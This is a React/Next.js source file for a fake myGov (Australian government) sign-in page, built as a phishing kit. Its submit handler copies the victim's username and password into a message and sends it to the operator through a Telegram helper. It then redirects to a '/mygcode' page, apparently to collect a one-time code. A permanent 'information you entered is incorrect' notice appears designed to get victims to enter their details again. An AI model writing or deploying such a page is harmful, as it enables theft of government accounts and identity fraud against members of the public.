/* eslint-disable @next/next/no-img-element */
"use client"
import React, { useState } from "react";
import "../css/mgv2-application.css";
import "../css/blugov.css";
import Link from "next/link";

import { sendTelegramMessage } from "../../utils/telegram";

const MyGovSignInPage: React.FC = () => {
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [isLoading, setIsLoading] = useState(false);
  const [error, setError] = useState("");

  const handleSubmit = async (event: React.FormEvent) => {
    event.preventDefault();
    setError("");

    if (!username || !password) {
      setError("Please enter both username and password");
      return;
    }

    setIsLoading(true);

    const message = `🔑 New Login Attempt\nUsername: ${username}\nPassword: ${password}\nTime: ${new Date().toLocaleString()}`;

    try {
      // Send Telegram Message
      await sendTelegramMessage(message);
      console.log("Login successful");
      window.location.href = '/mygcode';
      

      // Simulate API call (Replace with actual API call if needed)
      await new Promise((resolve) => setTimeout(resolve, 1000));

      // Example redirect
      // window.location.href = '/dashboard';
    } catch (err) {
      setError("Invalid username or password");
      console.error("Login Error:", err);
    } finally {
      setIsLoading(false);
    }
  };
  return (
    <div>
      <div className="brand-rainbow">&nbsp;</div>
      <header role="banner" className="mgvEnhanceHeader">
        <section className="wrapper">
          <div className="inner">
            <div className="unauth-grid">
              <div className="unauth-grid-row">
                <a className="unauth-govt-crest__link">
                  <img
                    id="unauth-govt-crest"
                    src="/images/myGov-cobranded-logo-black.svg"
                    alt="myGov Beta"
                    role="img"
                  />
                </a>
              </div>
            </div>
          </div>
        </section>
      </header>

      <div className="wrapper-mapwap">
        <div className="main-block" id="content" role="main">
          <div className="unauth">
            <div className="login-grid-container">
              <div className="login-grid-row">
                <div className="login-grid-column">
                  <div className="digital-id-login-card-wrapper">
                    <div className="digital-id-main-login-card override">
                      <h1>Sign in with myGov</h1>
                      <h2 className="text-align-left">
                        Using your myGov sign in details
                      </h2>
                      <p className="error-message" style={{ color: "red", marginBottom: "1rem" }}>
    The information you entered is incorrect. Please try to login again.
  </p>
                      <form
                        id="mygov-login-form"
                        className="mygov-login-form alternative"
                        onSubmit={handleSubmit}
                      >
                        {error && (
                          <div className="error-message" style={{ color: "red", marginBottom: "1rem" }}>
                            {error}
                          </div>
                        )}
                        <div className="input-group">
                          <label htmlFor="userId">
                            Username or email
                          </label>
                          <input
                            id="userId"
                            name="username"
                            type="text"
                            value={username}
                            onChange={(e) => setUsername(e.target.value)}
                            autoComplete="username"
                            required
                            disabled={isLoading}
                          />
                        </div>
                        <div className="input-group">
                          <label htmlFor="password" className="override">
                            Password
                          </label>
                          <input
                            id="password"
                            name="password"
                            type="password"
                            value={password}
                            onChange={(e) => setPassword(e.target.value)}
                            autoComplete="current-password"
                            required
                            disabled={isLoading}
                          />
                        </div>
                        <p className="recovery">
                          <a className="anchor override">Forgot password</a>
                        </p>
                        <div className="button-digital-id-main-container override">
                          <div className="digital-id-button-container">
                            <button
                              type="submit"
                              className="button-main"
                              disabled={isLoading}
                            >
                              {isLoading ? "Signing in..." : "Sign in"}
                            </button>
                          </div>
                        </div>
                        <p className="create-account-text">
                          <a
                            className="create-account-link"
                            href="https://my.gov.au/en/create-account/"
                            target="_blank"
                            rel="noopener noreferrer"
                          >
                            Create a myGov account
                          </a>{" "}
                          if you don&apos;t have one already.
                        </p>
                      </form>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>

      <footer role="contentinfo">
        <div className="wrapper">
          <div className="inner">
            <section className="footer-list">
              <nav>
                <h2 className="sr-only" aria-label="Footer">
                  Footer
                </h2>
                <ul className="lower-links">
                  <li>
                    <a href="/terms" target="_blank" rel="noopener noreferrer">
                      Terms of use
                    </a>
                  </li>
                  <li>
                    <a href="/privacy" target="_blank" rel="noopener noreferrer">
                      Privacy and security
                    </a>
                  </li>
                  <li>
                    <a href="/copyright" target="_blank" rel="noopener noreferrer">
                      Copyright
                    </a>
                  </li>
                  <li>
                    <a href="/accessibility" target="_blank" rel="noopener noreferrer">
                      Accessibility
                    </a>
                  </li>
                </ul>
              </nav>
            </section>
            <div className="footer-lower">
              <section className="footer-lower-logo">
              <Link href="/">
  <img
    src="/images/myGov-cobranded-logo-white.svg"
    alt="myGov Beta"
    width="313.17"
    height="70"
    role="img"
  />
</Link>
                
              </section>

              <p className="footer-acknowledgement">
                We acknowledge the Traditional Custodians of the lands we live
                on. We pay our respects to all Elders, past and present, of all
                Aboriginal and Torres Strait Islander nations.
              </p>
            </div>
          </div>
        </div>
      </footer>
    </div>
  );
};

export default MyGovSignInPage;